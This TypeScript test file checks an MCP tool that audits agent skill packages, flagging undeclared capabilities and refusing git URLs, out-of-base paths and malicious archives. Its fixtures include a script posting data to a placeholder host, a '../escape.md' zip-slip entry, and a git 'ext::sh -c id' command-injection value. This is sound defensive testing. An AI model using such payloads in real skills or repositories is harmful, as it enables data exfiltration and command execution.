/**
 * audit_skill: install verdicts over MCP. Local paths inside the base only;
 * git URLs are refused so that a model cannot make the server clone.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { createAuditServer } from "../src/index.js";
import { buildZip } from "../../core/test/archive-builders.js";

const temp = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "code-audit-mcp-skill-")));
const base = path.join(temp, "base");
const outside = path.join(temp, "outside");
let client: Client;

function write(file: string, content: string | Buffer): void {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, content);
}

async function call(args: Record<string, unknown>): Promise<{ isError: boolean; json: Record<string, unknown> }> {
  const result = (await client.callTool({ name: "audit_skill", arguments: args })) as {
    content: Array<{ text: string }>;
    isError?: boolean;
  };
  const text = result.content[0]?.text ?? "{}";
  expect(Buffer.byteLength(text, "utf8")).toBeLessThanOrEqual(8000);
  return { isError: result.isError === true, json: JSON.parse(text) as Record<string, unknown> };
}

beforeAll(async () => {
  write(path.join(base, "skills/clean/SKILL.md"), "---\nname: clean\ndescription: formats tables\n---\n\nFormat the table.\n");
  write(
    path.join(base, "skills/cap/SKILL.md"),
    "---\nname: cap\ndescription: uploads\nallowed-tools: Read\n---\n\nRun scripts/up.py.\n",
  );
  write(path.join(base, "skills/cap/scripts/up.py"), "import requests\nrequests.post('https://example.invalid', data=b'x')\n");
  write(path.join(base, "pkg.zip"), buildZip([{ name: "SKILL.md", data: "---\nname: zipped\ndescription: x\n---\nhello\n" }]));
  write(path.join(base, "slip.zip"), buildZip([{ name: "../escape.md", data: "x" }]));
  write(path.join(outside, "SKILL.md"), "---\nname: outside\ndescription: x\n---\n");
  fs.symlinkSync(outside, path.join(base, "link-out"));
  const server = createAuditServer({ base });
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await server.connect(serverTransport);
  client = new Client({ name: "skill-test", version: "0" });
  await client.connect(clientTransport);
});

afterAll(async () => {
  await client.close();
  fs.rmSync(temp, { recursive: true, force: true });
});

describe("audit_skill", () => {
  it("returns a verdict per package, wrapped as untrusted content", async () => {
    const { isError, json } = await call({ target: "skills", recursive: true, offline: true });
    expect(isError).toBe(false);
    expect(json.verdict).toBe("REVIEW");
    expect(json.untrusted_content).toBe(true);
    const packages = json.packages as Array<Record<string, unknown>>;
    expect(packages.map((pkg) => [pkg.path, pkg.verdict])).toEqual([
      ["cap", "REVIEW"],
      ["clean", "SAFE_TO_INSTALL"],
    ]);
    expect(packages[0]?.rule_ids).toContain("skill-undeclared-capability");
    expect(String(packages[0]?.details)).toMatch(/^<<<UNTRUSTED_REPOSITORY_CONTENT>>>/);
    expect(String(packages[1]?.verdict_text)).toContain("not a guarantee of safety");
    expect(fs.existsSync(String(json.json_path))).toBe(true);
    // Never into the vetted package.
    expect(String(json.run_dir).startsWith(path.join(base, ".audit"))).toBe(true);
    expect(fs.existsSync(path.join(base, "skills", ".audit"))).toBe(false);
  });

  it("scans an archive inside the base and writes the run to <base>/.audit", async () => {
    const { isError, json } = await call({ target: "pkg.zip", offline: true });
    expect(isError).toBe(false);
    expect(json.target_kind).toBe("archive");
    expect(json.verdict).toBe("SAFE_TO_INSTALL");
    expect(String(json.run_dir).startsWith(path.join(base, ".audit"))).toBe(true);
  });

  it("refuses a hostile archive", async () => {
    const { isError, json } = await call({ target: "slip.zip", offline: true });
    expect(isError).toBe(true);
    expect((json.error as { code: string }).code).toBe("ARCHIVE_BAD_PATH");
  });

  it.each([
    "https://github.com/anthropics/skills",
    "ssh://git@github.com/anthropics/skills.git",
    "git@github.com:anthropics/skills.git",
    "file:///etc",
    "ext::sh -c id",
  ])("refuses the git URL %s", async (target) => {
    const { isError, json } = await call({ target });
    expect(isError).toBe(true);
    expect((json.error as { code: string }).code).toBe("GIT_URL_REFUSED");
  });

  it("refuses targets outside the base, also through a symbolic link", async () => {
    for (const target of [outside, "../outside", "link-out"]) {
      const { isError, json } = await call({ target, offline: true });
      expect(isError, target).toBe(true);
      expect((json.error as { code: string }).code, target).toBe("OUTSIDE_BASE");
    }
  });

  it("reports a missing target", async () => {
    const { isError, json } = await call({ target: "nope" });
    expect(isError).toBe(true);
    expect((json.error as { code: string }).code).toBe("SKILL_TARGET_MISSING");
  });
});
